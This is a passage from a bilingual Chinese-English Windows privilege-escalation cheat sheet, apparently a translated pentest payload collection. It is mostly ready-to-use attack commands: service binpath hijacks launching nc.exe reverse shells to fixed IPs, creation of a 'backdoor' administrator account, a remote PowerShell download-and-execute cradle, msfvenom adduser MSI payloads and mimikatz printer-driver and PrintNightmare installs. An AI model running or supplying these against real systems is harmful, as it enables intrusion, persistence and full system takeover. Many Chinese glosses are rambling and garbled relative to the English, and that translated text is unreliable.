sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

如果因为缺少依赖项而失败，请尝试运行以下命令。 (If it fails because of a missing dependency, try the following commands.)

```powershell
sc config SSDPSRV start=auto
net start SSDPSRV
net stop upnphost
net start upnphost

sc config upnphost depend=""
```

使用来自 Sysinternals [的 \`accesschk\`](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe) 或 [accesschk-XP.exe - github.com/phackt](https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe) (Using [`accesschk`](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe) from Sysinternals or [accesschk-XP.exe - github.com/phackt](https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe))

```powershell
$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

$ accesschk.exe -ucqv upnphost
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS

$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
$ sc stop <vuln-service>
$ sc start <vuln-service>
$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
$ sc stop <vuln-service>
$ sc start <vuln-service>
```

## 权限提升 - 适用于 Linux 的 Windows 子系统（WSL）(EoP - Windows Subsystem for Linux (WSL))

> 具有 root 权限的 Windows Subsystem for Linux (WSL) 允许用户在任何端口上创建绑定 shell（不需要提权）。不知道 root 密码？没问题，只需使用 `<distro>.exe --default-user root` 将默认用户设置为 root。现在启动你的绑定 shell 或反弹 shell。 - [Warlockobama's tweet](https://twitter.com/Warlockobama/status/1067890915753132032) (With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ `<distro>.exe --default-user root`. Now start your bind shell or reverse. - [Warlockobama's tweet](https://twitter.com/Warlockobama/status/1067890915753132032))

```powershell
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 中找到 `bash.exe` 二进制文件。 (Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`)

或者，你可以在 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 文件夹中找到有关 `WSL` 的文件系统环境。(Alternatively you can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`)

## 权限提升 - 未引用的服务路径 (EoP - Unquoted Service Paths)

Microsoft Windows 引发的路径配置错误类型漏洞，被称为 Unquoted Service Path Enumeration Vulnerability。所有的 Windows 系统服务对于其运行的指定可执行二进制的程序文件都有自身预先设计的路径结构。若这个保存执行文件程序目标的路径信息自身并非处于加了引号的内容，而在自身字词文字之内有额外的包含着空格，抑或其他用来作为部分间用来做拆解以及分开用的文字内容字符，那样这些受到的相关特定 Windows 服务类型将会尝试进行按照路径信息中指向自身来源根位置以及对应的各层次文件夹，优先请求使用它们上层内的相关同名执行对象资源。 (The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.)

```powershell
# 在 CMD 下运行 (in CMD)
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr /i /v """
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
# 在 PowerShell 下运行 (in PowerShell)
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

* Metasploit 利用库模块代码 : `exploit/windows/local/trusted_service_path`
* PowerUp 脚本漏洞利用

    ```powershell
    # 找到存在漏洞的应用 (find the vulnerable application)
    C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

    ...
    [*] Checking for unquoted service paths...
    ServiceName   : BBSvc
    Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
    StartName     : LocalSystem
    AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
    ...

    # 自动利用代码 (automatic exploit)
    Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
    ```

### 范例 (Example)

对于 `C:\Program Files\something\legit.exe`，Windows 会首先尝试以下路径：(For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:)

* `C:\Program.exe`
* `C:\Program Files.exe`

## 权限提升 - $PATH 拦截 (EoP - $PATH Interception)

要求 (Requirements):

* PATH 变量中在拥有低权限的情况下具有可写访问权限的文件目录内容记录。 (PATH contains a writable folder with low privileges.)
* 包含此权限较低且可以用来写入记录配置所在的文件夹信息字符串记录位于目标所需指向并且用来指定加载的可法制程序源目标内容的更**前方**记录排序段里面内容。(The writable folder is _before_ the folder that contains the legitimate binary.)

例如 (EXAMPLE):

```powershell
# 显示当前环境变量 PATH 中指定位置保存的信息设定内容数据 (List contents of the PATH environment variable)
# 预期显示的例子输出结果 (EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32)
$env:Path

# 查询针对指定的对象位置所能得到的相应赋予操作类型等记录列表 (See permissions of the target folder)
# 预期显示的输出的查询反馈配置记录输出的内容。例如 (EXAMPLE OUTPUT: BUILTIN\Users: GR,GW)
icacls.exe "C:\Program Files\nodejs\"

# 复制我们指定的携带破坏性逻辑目的的病毒或攻击性程序，也就是后门程序本身所要替换的对象保存的原来源存储源的位置的存放区域。 (Place our evil-file in that folder.)
copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
```

由于（在这个例子中）在 PATH 环境变量参数设置列表当中 "C:\Program Files\nodejs\" 内容被放到了在 "C:\WINDOWS\system32\" 字符串配置前面进行设置声明，而后续的，当下一次有被调用的用户在需要执行并运行 "cmd.exe" 时，我们此前存储存放到那个节点所在的 NodeJS 对象文件里保存存储版本的恶意对象变种就会替代存放在 Windows 系统底下的 C盘原本的 System32 系统对象目录下安全无害并且被官方合法的，未经修改与植入代码病毒木马或任何其他危害安全因素后门命令执行实体。这就完成了劫持逻辑以及流程并且实现了执行。(Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder.)
## 权限提升 - 命名管道 (EoP - Named Pipes)

1. 寻找命名管道 (Find named pipes): `[System.IO.Directory]::GetFiles("\\.\pipe\")`
2. 检查命名管道自由访问控制列表 (Check named pipes DACL): `pipesec.exe <named_pipe>`
3. 逆向工程软件 (Reverse engineering software)
4. 将生成数据输送到命名管道 (Send data throught the named pipe) : `program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`

## 权限提升 - 内核漏洞利用 (EoP - Kernel Exploitation)

有关在系统底层由于使用和开发产生的不足与缺陷引发能够遭到不法人员针对目标被入侵主机构成的直接提权内核安全隐患与缺陷目录报告列表整理内容和清单列表页面 : [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) (List of exploits kernel : [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits))

### 安全公告表 (Security Bulletin Table)

| 安全公告栏 (Security Bulletin) | KB 知识库版本限制 (KB) | 描述 (Description)                                         | 操作系统版本 (Operating System)                             |
|------------------|-----------|-----------------------------------------------------|-----------------------------------------|
| [MS17-017](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-017) | KB4013081 | GDI Palette Objects Local Privilege Escalation | Windows 7/8 |
| [CVE-2017-8464](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-8464) | - | LNK Remote Code Execution Vulnerability | Windows 10/8.1/7/2016/2010/2008 |
| [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213) | - | Windows COM Elevation of Privilege Vulnerability | Windows 10/8.1/7/2016/2010/2008 |
| [CVE-2018-0833](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-0833) | - | SMBv3 Null Pointer Dereference Denial of Service | Windows 8.1/Server 2012 R2 |
| [CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120) | - | Win32k Elevation of Privilege Vulnerability | Windows 7 SP1/2008 SP2, 2008 R2 SP1 |
| [MS17-010](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-010) | KB4013389 | Windows Kernel Mode Drivers | Windows 7/2008/2003/XP |
| [MS16-135](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135) | KB3199135 | Windows Kernel Mode Drivers | 2016 |
| [MS16-111](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-111) | KB3186973 | Kernel API | Windows 10 10586 (32/64)/8.1 |
| [MS16-098](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098) | KB3178466 | Kernel Driver | Windows 8.1 |
| [MS16-075](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075) | KB3164038 | Hot Potato | 2003/2008/7/8/2012 |
| [MS16-034](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034) | KB3143145 | Kernel Driver | 2008/7/8/10/2012 |
| [MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032) | KB3143141 | Secondary Logon Handle | 2008/7/8/10/2012 |
| [MS16-016](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-016) | KB3136041 | WebDAV | 2008/Vista/7 |
| [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014) | KB3134228 | Remote Code Execution | 2008/Vista/7 |
| [MS03-026](https://www.exploit-db.com/exploits/66) | KB823980 | Buffer Overrun In RPC Interface | NT/2000/XP/2003 |

要从 Kali 下编译一个目标在其他平台操作系统可以运作或者测试运行的应用程序所需在主机操作界面内输入的生成使用的命令。(To cross compile a program from Kali, use the following command.)

```powershell
Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
```

## 权限提升 - Microsoft Windows 安装程序 (EoP - Microsoft Windows Installer)

### AlwaysInstallElevated

通过使用 `reg query` 指令方法，可以借以此探查用户组属性与注册信息数据库中的键值参数设置是否拥有被赋值启用并具有更高层级的对象功能（检查 `AlwaysInstallElevated` 键的状态）。当你执行完针对二者之间分别独立的请求和检查等相关指令返回后可以显示出来的两项查询反馈显示都给出的信息均为配置处于等值为 `0x1`，那就证实已经为用户以及当前这个配置部署设备的层面上在所有的环境中被标记处于允许状态。(Using the `reg query` command, you can check the status of the `AlwaysInstallElevated` registry key for both the user and the machine. If both queries return a value of `0x1`, then `AlwaysInstallElevated` is enabled for both user and machine, indicating the system is vulnerable.)

* Shell 命令查询 (Shell command)

    ```powershell
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```

* PowerShell 命令查询 (PowerShell command)

    ```powershell
    Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
    Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
    ```

然后就能针对这种情况并根据所要测试的项目进行建立配置部署专属于我们的拥有特殊功能与特殊手段实现相关特权任务测试与越权实现以及可以使得操作权限实现更高阶执行操作任务部署包去展开运行验证以测试安全能力。（创建一个 MSI 包然后将其执行安装以完成提权测试）。(Then create an MSI package and install it.)

```powershell
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
msiexec /quiet /qn /i C:\evil.msi
```

该技巧也可在其他平台获取部署。 (Technique also available in :)

* 通过 Metasploit 等工具的命令库直接在程序包的模块中运行使用操作代码 : (Metasploit : `exploit/windows/local/always_install_elevated`)
* 通过工具 `PowerUp.ps1` 调用的方法命令语句： (PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`)

### CustomActions

> 在 MSI 安装组件架构中所采用的一些能够使程序安装工具本身能够在多种或者被设定好指定的情景状态并根据所遇到相应的条件下可以借此来实现使用通过其他手段或形式被加入脚本或者应用程序（开发者定义能够在安装流程的特定的环境事件处能够展开或者处理所需要的一些可执行指令操作等程序的运作能力），一般被视为可自定义处理行为机制逻辑组件模块。(Custom Actions in MSI allow developers to specify scripts or executables to be run at various points during an installation)

* [mgeeky/msidump](https://github.com/mgeeky/msidump) - 一个能够用来分析针对伪装性质、藏匿风险成分具有一定危害影响以及意图展开对计算机信息数据构成负面行为影响和安全破坏情况的恶意识别分析并且被投入应用使用，可从这种经过恶意处理的部署安装文件等对象进行特征解析来提取以及剥离对象里面一些不具备表面功能的非正常特征成分以识别判断，同时也能针对从二进制层面上提取文件、提取出所包含的数据等能够用来辅助排雷使用以及附着并包含 YARA 规则等组件内容信息等相关功能特性用来辨识程序文件内容安全与否的鉴别查杀识别辅助脚本程序。(a tool that analyzes malicious MSI installation packages, extracts files, streams, binary data and incorporates YARA scanner.)
* [activescott/lessmsi](https://github.com/activescott/lessmsi) - 用于查看提取获取安装数据类型扩展名的配置文件内的相关信息以及被打包捆绑的内容程序工具软件组件。(A tool to view and extract the contents of an Windows Installer (.msi) file.)
* [mandiant/msi-search](https://github.com/mandiant/msi-search) - 一个针对执行一些包含各种网络安全相关渗透工作时对于参与并进行检查发现、攻防模拟或者排查寻找相关可利用资源的人员或者团队所提供的针对所包含在被检查环境里发现相关具备对应后缀名为这类的特殊文件，以此实现辅助或者辅助性便利其在能够找寻并且能够判断匹配那些在他们手上拥有文件所要能够实现对应的具体应用软件程序或者信息内容以明确掌握所关联以及能关联软件的辅助搜找匹配识别及可以针对获取目标执行文件和数据下载关联能力的工具组件。(This tool simplifies the task for red team operators and security teams to identify which MSI files correspond to which software and enables them to download the relevant file.)

枚举在被测试当前系统中已存在的正在运行安装或者过去曾经执行部署运行安装相关的产品信息。(Enumerate products on the machine)

```ps1
Get-WmiObject Win32_Product | Select Name, LocalPackage
wmic product get identifyingnumber,name,vendor,version,localpackage
```

使用带有 `/fa` 参数来执行对原程序部署系统或环境软件的恢复功能修复执行指令，借以此来使得能够调用那些存在于内部或者其附加具有针对相关运行动作行为操作或者触发相关执行行为指令模块的功能的响应操作以便使得可以运作执行这部分自定义操作指令内容。(Execute the repair process with the `/fa` parameter to trigger the CustomActions.)
在此，你可以在这使用 IdentifyingNumber (`{E0F1535A-8414-5EF1-A1DD-E17EDCDC63F1}`) 亦或者是安装执行软件的本地绝对指向路径（如：`c:\windows\installer\XXXXXXX.msi`）。两人皆可支持执行完成。 (We can use both IdentifyingNumber `{E0F1535A-8414-5EF1-A1DD-E17EDCDC63F1}` or path to the installer `c:\windows\installer\XXXXXXX.msi`.)
而且在这一阶段使用修复操作所产生的服务运作执行调用的帐户权限都是运行于系统最底层的拥有非常大的操作及处理调用数据安全访问权限的顶级（内置 NT）账户级别体系环境中完成执行任务响应调度分配过程。(The repair will run with the NT SYSTEM account.)

```ps1
$installed = Get-WmiObject Win32_Product
$string= $installed | select-string -pattern "PRODUCTNAME"
$string[0] -match '{\w{8}-\w{4}-\w{4}-\w{4}-\w{12}}'
Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa $($matches[0])"
```

这也就给安全防护问题导致了可利用的安全缺陷在某些配置不规范的（针对软件程序的 MSI 原生的部署和配置文件程序中所暴露存在并在运行下体现）错误设置问题：(Common mistakes in MSI installers:)

* 缺乏使用且丢失使用在部署过程应当采取非干预、无视反馈等不显性运行界面且隐蔽于被遮掩环境状态在底层处理等静默运行命令：因此将导致由于缺乏这部分命令导致这程序其本身的交互或者反馈展现能够借由 `NT SYSTEM` 这等系统底层的绝对高分管理运行帐户借以直接弹出来并展现供直接在未加以权限降阶配置的环境条件控制范围内进行使用，且展现 `conhost.exe` 系统基础原生运行窗口。使用键盘操作快捷命令例如 `[CTRL]+[A]` 在出现相关界面的时刻将其处于窗口展示页面内部存在的内容、字符串、或者对象进行相关全覆盖性质选择能够用来中断或者冻结正在产生或发生的页面加载程序环境内部系统运作进行操作进程步骤，使其暂时不要关闭退出等行为发生。 (Missing quiet parameters: it will spawn `conhost.exe` as `NT SYSTEM`. Use `[CTRL]+[A]` to select some text in it, it will pause the execution.)
    * conhost -> properties (属性) -> "legacy console mode" Link (遗留控制台模式链接) -> Internet Explorer -> CTRL+O –> cmd.exe
* 那些在界面的内部或者相关页面内容中有指向并且自身不处于严格沙盒或被完全彻底进行验证和安全性权限限定和阻绝环境具有可以调用触发其他独立子程序或软件组件的执行或链接到其他内容功能的 GUI 程序：比如有一个可以通过链接直接就可以执行进行展开浏览器并访问等能力，那针对这类情形，那么就可以利用并采纳一样类型的漏洞提交流程测试。(GUI with direct actions: open a URL and start the browser then use the same scenario.)
* 如果这属于相关一些可使用能够从具备了针对一般或者是受被限制的具有常规基本能读取或执行且存在低风险读写读的被限定能够存在一般用户具备可写执行编辑改动文件操作目录位置的环境去引用等，这类被加载的可运行调用关联等附加脚本或是依赖相关的被调用运行执行软件功能（在此你可能还会在操作过程中遇到有关程序本身需要对于各种信息调用并处理反馈竞争条件的这等情形并获取其优势以实现利用提权等）。(Binaries/Scripts loaded from user writable paths: you might need to win the race condition.)
* 滥用 DLL （或者其具有动态调用的函数）相关被引用库存在加载调用以及在相关解析时的劫持与替换使用或者利用改变替换系统原有既默认执行指令搜索文件排序优先级调用逻辑顺序来进行的相关攻击。(DLL hijacking/search order abusing)
* PowerShell 在未加入强制声明约束排除忽略并禁止引入或解析环境以及自身附带着的一些包含系统与用户定制特性的命令在进行执行时 `-NoProfile`：这也就是导致可能在此加入自建执行内容的权限漏洞等情形，可用于在这类等文件中置入针对自己设置构建的命令（或者是在相关用户目录下在调用被附带加入进去的个人定制的内容里面放入一些额外的系统执行项），比如你可以将你自己构造的在个人定制属性的文件内容里面将如下这类型可致直接可以取得一定环境操作获取相关利用或权限提权的测试证明等语句附加在这类型的脚本配置当中使用： (PowerShell `-NoProfile` missing: Add custom commands into your profile)

    ```ps1
    new-item -Path $PROFILE -Type file -Force
    echo "Start-Process -FilePath cmd.exe -Wait;" > $PROFILE
    ```

## 权限提升 - 不安全的 GUI 应用 (EoP - Insecure GUI apps)

这等应用程序如果是以系统管理员或超级管理最高级别帐户也就是系统环境中最底层的服务 SYSTEM 的级别身份以及角色等环境下跑着，借此便有可能能让任何处在环境里的其他人或测试工程师在其中或者被暴露借用的各种操作条件下去取得用于操作底层终端或者可以直接可以进入访问那些相关私有与安全敏感受到高度防护并针对权限受到控制不随意让人翻查等位置的信息查阅的访问及执行资格。 (Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.)

比如：在原生的系统中（调用如按下 Windows 加上 F1 这类型的热键，或是触发使用类似于系统中的 "请求针对疑问查询等问题的各种文档以及各种查阅及问题反馈与指导的窗口" ），并在里面执行进行内容方面的输入查询等功能，如同在里头输入指令行等窗口或指令等信息进行搜索，然后尝试着在可以引发被其本身内置能够打开执行开启其本身相对应组件（像是在提供指引或者是参考解答内容页面显示 "能够用于产生在终端进行运行的执行指引点此开启等相关按钮" 时直接点入进而触发这类系统原生或带有这等权限身份等内置软件等进行直接越级操作。 (Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt")

## 权限提升 - 评估易受攻击的驱动程序 (EoP - Evaluating Vulnerable Drivers)

去查找这些已经载入环境被使用的驱动程序是否可能就是会导致安全突破的问题等，因为通常很多人都会对此并没有在相关检查或者注意去进行对他们进行检查，并没有付出太多能够投入足够的防范或者检查等工作去关注或防范：（我们经常会遇到缺乏对在这个地方存在或暴露有能够产生并被拿来进行权限绕过或者用来作为能被控制利用并获取更高控制身份被拿来进行获取权限或是具有安全潜在不足隐患等的进行排查这些问题关注投入上相对不充分的这类情况出现） (Look for vuln drivers loaded, we often don't spend enough time looking at this:)

* [Living Off The Land Drivers](https://www.loldrivers.io/) 这是一份用来为防守人员、防御构建工程师或是测试分析员提供了一份整理过汇总，在系统中属于微软或者是第三方那些能够存在于系统中用以防守人员了解到在这其中可能会遭遇一些攻击者、或者带有目的不轨意图的团体或人员能被加以使用滥用于可以帮助他们成功用来使得躲开系统原生在针对各类入侵抵御所构筑保护及监控，或被利用进行在各类隐蔽以及具有破坏性质攻击破坏所实施被各种恶意人员用来绕开安全验证，被作为发起突破入侵系统所用到驱动程序的一个被精心打理经过相关研究工作并且分类以及用于帮助用来认识与防范参考的整合性项目等内容清单资源链接库。 这个能够让人在这方面不仅为提供能够让那些有相关安全知识需求相关人员在能够防范可能具有的对环境构成危险被实施滥利用有更好的相关指导，也有助减少可能遇到风险隐患问题的影响发生以保持防范以及随时应战。 (Living Off The Land Drivers is a curated list of Windows drivers used by adversaries to bypass security controls and carry out attacks. The project helps security professionals stay informed and mitigate potential threats.)
* 操作系统自身原生的可调用能够检测这部分内容并能进行系统内部对处于被使用或者被安装引入的信息列表展示等功能命令所使用用来查看并进行这方面了解查询在系统内使用及所处运行等执行状况情况等参数等情况状态的查询程序：(`DriverQuery.exe`) (Native binary: DriverQuery.exe)

    ```powershell
    PS C:\Users\Swissky> driverquery.exe /fo table /si
    Module Name  Display Name           Driver Type   Link Date
    ============ ====================== ============= ======================
    1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM
    3ware        3ware                  Kernel        5/18/2015 6:28:03 PM
    ACPI         Microsoft ACPI Driver  Kernel        12/9/1975 6:17:08 AM
    AcpiDev      ACPI Devices driver    Kernel        12/7/1993 6:22:19 AM
    acpiex       Microsoft ACPIEx Drive Kernel        3/1/2087 8:53:50 AM
    acpipagr     ACPI Processor Aggrega Kernel        1/24/2081 8:36:36 AM
    AcpiPmi      ACPI Power Meter Drive Kernel        11/19/2006 9:20:15 PM
    acpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM
    ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
    <SNIP>
    ```

* [matterpreter/OffensiveCSharp/DriverQuery](https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery)

    ```powershell
    PS C:\Users\Swissky> DriverQuery.exe --no-msft
    [+] Enumerating driver services...
    [+] Checking file signatures...
    Citrix USB Filter Driver
        Service Name: ctxusbm
        Path: C:\Windows\system32\DRIVERS\ctxusbm.sys
        Version: 14.11.0.138
        Creation Time (UTC): 17/05/2018 01:20:50
        Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US
        Signer: CN="Citrix Systems, Inc.", OU=XenApp(ClientSHA256), O="Citrix Systems, Inc.", L=Fort Lauderdale, S=Florida, C=US
    <SNIP>
    ```

## 权限提升 - 打印机 (EoP - Printers)

### 通用打印机 (Universal Printer)

创建属于可以进行测试并具有执行功能性的伪装使用的一个属于用于作为能够获取高级别或者作为高权限或者拥有一些相关非普通功能进行能够执行获取部分控制执行权利等功能为目的用于实现提权和相关访问突破能力测试等打印机对象。(Create a Printer)

```ps1
$printerName     = 'Universal Priv Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
 
Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
 
Add-PrinterDriver -Name       'Generic / Text Only'
Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
 
New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
```

执行该驱动程序：(Execute the driver)

```ps1
$serverName  = 'dc.purple.lab'
$printerName = 'Universal Priv Printer'
$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName
```

### PrinterNightmare

```ps1
git clone https://github.com/Flangvik/DeployPrinterNightmare
PS C:\adversary> FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
[<3] @Flangvik - TrustedSec
[+] Copying C:\Windows\system32\mscms.dll to C:\Windows\system32\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Copying 64mimispool.dll to C:\Windows\system32\spool\drivers\x64\3\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Copying 32mimispool.dll to C:\Windows\system32\spool\drivers\W32X86\3\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Adding printer driver => Generic / Text Only!
[+] Adding printer => EasySystemShell!
[+] Setting 64-bit Registry key
[+] Setting 32-bit Registry key
[+] Setting '*' Registry key
```

```ps1
PS C:\target> $serverName  = 'printer-installed-host'
PS C:\target> $printerName = 'EasySystemShell'
PS C:\target> $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
PS C:\target> Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
PS C:\target> Add-Printer -ConnectionName $fullprinterName
```

### 自带漏洞 (Bring Your Own Vulnerability)

[jacob-baines/concealed_position](https://github.com/jacob-baines/concealed_position)

* ACIDDAMAGE - [CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449) - Lexmark Universal Print Driver LPE
* RADIANTDAMAGE - [CVE-2021-38085](https://nvd.nist.gov/vuln/detail/CVE-2021-38085) - Canon TR150 Print Driver LPE
* POISONDAMAGE - [CVE-2019-19363](https://nvd.nist.gov/vuln/detail/CVE-2019-19363) - Ricoh PCL6 Print Driver LPE
* SLASHINGDAMAGE - [CVE-2020-1300](https://nvd.nist.gov/vuln/detail/CVE-2020-1300) - Windows Print Spooler LPE

```powershell
cp_server.exe -e ACIDDAMAGE
# Get-Printer
# 将其配置中的信息设定如 "高级共享设置" 处设置更改成 -> "关闭密码保护的共享" 这等相关项目以使其达到相关要求等可以便于被利用实现的环境。(Set the "Advanced Sharing Settings" -> "Turn off password protected sharing")
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
cp_client.exe -l -e ACIDDAMAGE
```

## 权限提升 - Runas

使用 `cmdkey` 去得到或发现该电脑里面曾经所进行认证连接中且有保存以及可直接免再次等要求操作所能够产生和存在系统环境内部已被存储被保存下来的用于进行登录或使用的可以利用及查看获取当前系统里已被存储着有关这方面内容的各种相关记录。(Use the `cmdkey` to list the stored credentials on the machine.)

```powershell
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

